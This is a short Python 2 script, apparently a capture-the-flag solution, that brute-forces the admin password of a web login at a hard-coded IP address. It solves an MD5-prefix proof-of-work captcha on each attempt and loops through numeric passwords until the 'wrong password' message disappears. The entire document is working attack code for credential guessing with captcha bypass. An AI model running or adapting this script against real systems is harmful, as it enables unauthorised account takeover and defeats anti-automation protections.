# -*- coding=utf-8 -*-
import hashlib
import requests
import re
passwd = 100
while True:
    if passwd >= 1000:
        break
    r = requests.session()
    reg = re.compile(r'(===\w{5})')
    cont = r.get('http://47.94.129.246:2132/baopo/index.php').content
    start = re.findall(reg, cont)[0][3:]
    print start
    r_code = 0
    while True:
        t = hashlib.md5(str(r_code)).hexdigest()
        if str(t).startswith(start):
            break
        else:
            r_code += 1
            continue
    url = 'http://47.94.129.246:2132/baopo/index.php?username=admin&password={}&randcode=' + str(r_code)
    new_url = url.format(str(passwd))
    print new_url
    res = r.get(url=new_url).content
    if '密码错误' in res:
        print res
        passwd += 1
        continue
    else:
        print res
        break